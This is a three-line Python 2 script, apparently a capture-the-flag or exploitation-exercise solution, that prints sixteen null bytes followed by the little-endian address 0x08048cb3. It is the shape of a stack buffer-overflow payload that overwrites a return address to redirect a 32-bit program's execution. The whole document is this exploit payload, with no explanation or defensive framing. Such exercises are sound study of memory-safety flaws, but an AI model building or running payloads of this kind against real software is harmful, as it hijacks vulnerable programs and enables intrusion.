from struct import pack
val = "\x00"
print val*16 + pack("<I",0x08048cb3)
